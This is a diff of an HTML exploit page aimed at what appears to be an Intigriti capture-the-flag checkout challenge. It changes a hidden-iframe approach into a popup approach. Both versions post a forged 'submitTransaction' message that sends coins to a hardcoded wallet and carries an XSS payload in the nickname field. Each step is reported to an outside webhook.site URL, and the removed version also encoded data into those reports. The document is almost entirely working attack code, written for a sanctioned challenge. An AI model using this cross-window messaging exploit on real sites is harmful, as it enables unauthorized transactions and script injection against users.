@@ -1,65 +1,47 @@
 <!DOCTYPE html>
-<html><head><title>Dynamic Iframe</title></head>
+<html><head><title>Popup Exploit</title></head>
 <body>
 <h2>Exploit</h2>
 <pre id=log></pre>
 <script>
-const WEBHOOK = 'https://webhook.site/8c12a157-e3ac-4e69-867a-ed4ebea2de88';
+const WEBHOOK = 'https://webhook.site/8b2e60bf-f559-4793-afac-5a501921e9b4';
 const WALLET = '16472226db03703a192aa383237035a69f';
 const log = document.getElementById('log');
 
 function report(step, data) {
     log.textContent += '\n' + step;
-    fetch(WEBHOOK + '?s=' + step + '&d=' + btoa(JSON.stringify(data||{}))).catch(()=>{});
+    fetch(WEBHOOK + '?s=' + step).catch(()=>{});
 }
 
-// Page loaded - report first
-report('1_PAGE_LOADED', {});
+report('1_LOADED');
 
-// After delay, create iframe dynamically
 setTimeout(function() {
-    report('2_CREATING_IFRAME', {});
+    report('2_OPENING_CHECKOUT');
     
-    const iframe = document.createElement('iframe');
-    iframe.src = 'https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1';
-    iframe.style.display = 'none';
-    document.body.appendChild(iframe);
+    const win = window.open('https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1', '_blank');
     
-    report('3_IFRAME_ADDED', {});
-    
-    iframe.onload = function() {
-        report('4_IFRAME_LOADED', {});
+    if (win) {
+        report('3_WINDOW_OPENED');
         
         setTimeout(function() {
-            try {
-                iframe.contentWindow.postMessage({
-                    type: 'submitTransaction',
-                    transaction: {
-                        toAddress: WALLET,
-                        currency: '1337COIN',
-                        amount: 1,
-                        nickname: '<img src=x onerror="alert(\'gigawatz\')">'
-                    }
-                }, '*');
-                
-                report('5_POSTMESSAGE_SENT', {});
-                
-                setTimeout(function() {
-                    report('6_REDIRECTING', {});
-                    window.location.href = 'https://challenge-0126.intigriti.io/marketwatch.html';
-                }, 2000);
-                
-            } catch(e) {
-                report('5_ERROR', {msg: e.message});
-            }
-        }, 2000);
-    };
-    
-    iframe.onerror = function() {
-        report('4_IFRAME_ERROR', {});
-    };
-    
-}, 1000);
+            report('4_SENDING_POSTMESSAGE');
+            
+            win.postMessage({
+                type: 'submitTransaction',
+                transaction: {
+                    toAddress: WALLET,
+                    currency: '1337COIN',
+                    amount: 1,
+                    nickname: '<img src=x onerror="alert(\'gigawatz\')">'
+                }
+            }, 'https://challenge-0126.intigriti.io');
+            
+            report('5_POSTMESSAGE_SENT');
+        }, 3000);
+    } else {
+        report('3_WINDOW_BLOCKED');
+    }
+}, 500);
 </script>
 </body>
 </html>
